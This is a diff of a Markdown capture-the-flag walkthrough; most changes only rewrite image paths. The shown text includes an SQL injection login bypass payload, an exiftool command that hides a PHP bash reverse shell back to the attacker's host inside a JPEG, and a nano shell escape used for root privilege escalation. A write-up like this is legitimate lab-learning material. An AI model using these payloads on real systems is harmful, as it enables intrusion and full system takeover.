@@ -1,20 +1,20 @@
 ---
 sticker: emoji//1f6e4-fe0f
 ---
-![](cybersecurity/images/Pasted%2520image%252020241007144603.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007144603.png)
 # Enumeration
 
 ```ad-info
 **OPEN PORTS**:
-![](cybersecurity/images/Pasted%2520image%252020241007144658.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007144658.png)
 **FUZZING FOR PORT 80**:
-![](cybersecurity/images/Pasted%2520image%252020241007150635.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007150635.png)
 
 ```
 
 The moment I went to `/gallery`, I realized it was a login page, I tried some XSS and when I sent the request, this was the output:
 
-![](cybersecurity/images/Pasted%2520image%252020241007150803.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007150803.png)
 Seems like this login page is vulnerable to [[SQL INJECTION (SQLI)|SQLI]]
 So, let's try to exploit it:
 
@@ -84,23 +84,23 @@ AND false
 
 Also, as seen in the request, it must be URL encoded, so, I also put this in the payload processing:
 
-![](cybersecurity/images/Pasted%2520image%252020241007152753.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007152753.png)
 
 Let's launch the attack:
-![](cybersecurity/images/Pasted%2520image%252020241007152809.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007152809.png)
 
-![](cybersecurity/images/Pasted%2520image%252020241007152818.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007152818.png)
 Seems like the attack worked for that payload, if we decode it, it is this payload:
 
 `' OR 1 -- -`
 
 And we got in as admin:
 
-![](cybersecurity/images/Pasted%2520image%252020241007153027.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007153027.png)
 
 If we look around, we find an image upload section:
 
-![](cybersecurity/images/Pasted%2520image%252020241007153644.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007153644.png)
 
 We can refer to our [[CYBERSECURITY/Bug Bounty/Vulnerabilities/SERVER SIDE VULNERABILITIES/FILE INCLUSION VULNERABILITIES/FILE UPLOAD|FILE UPLOAD]] note, when we try to upload a file, we can only upload images, `.jpg, .png` so, let's use `exiftool` to embed a reverse shell between an image:
 
@@ -111,13 +111,13 @@ exiftool -Comment="<?php echo shell_exec('/bin/bash -c \'bash -i >& /dev/tcp/YOU
 
 As we can see, file is an jpeg now:
 
-![](cybersecurity/images/Pasted%2520image%252020241007160746.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007160746.png)
 
 Let's try to upload it now:
 
-![](cybersecurity/images/Pasted%2520image%252020241007161320.png)
-![](cybersecurity/images/Pasted%2520image%252020241007161325.png)
-![](cybersecurity/images/Pasted%2520image%252020241007161334.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007161320.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007161325.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007161334.png)
 And we got a shell!
 
 Let's proceed with PRIVILEGE ESCALATION:
@@ -125,31 +125,31 @@ Let's proceed with PRIVILEGE ESCALATION:
 First, let's spawn a [[STABLE SHELL|stable shell]], once we've done this, it's time to begin with our privilege escalation:
 
 For the privilege escalation, I used [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), when I looked at linpeas output, I found this:
-![](cybersecurity/images/Pasted%2520image%252020241007163005.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007163005.png)
 seems like the password for user mike, let's su to mike:
 
-![](cybersecurity/images/Pasted%2520image%252020241007163600.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007163600.png)
 Now we are in as mike, let's look at mike's privileges:
 
-![](cybersecurity/images/Pasted%2520image%252020241007163724.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007163724.png)
 We found a rootkit.sh script, let's look at it:
 
-![](cybersecurity/images/Pasted%2520image%252020241007163807.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007163807.png)
 As shown in the read function of the script, it uses nano, if we go to gtfobins, this is shown:
-![](cybersecurity/images/Pasted%2520image%252020241007164109.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007164109.png)
 
 If we execute the script as the root user, this happens:
-![](cybersecurity/images/Pasted%2520image%252020241007165053.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007165053.png)
 
 Let's enter the read option:
-![](cybersecurity/images/Pasted%2520image%252020241007164217.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007164217.png)
 Next, enter `ctrl+r` and `ctrl+x`, then the following command:
 
 `reset; sh 1>&0 2>&0`
 
-![](cybersecurity/images/Pasted%2520image%252020241007165137.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007165137.png)
 
-![](cybersecurity/images/Pasted%2520image%252020241007165154.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020241007165154.png)
 
 And just like that, we got root access!
 
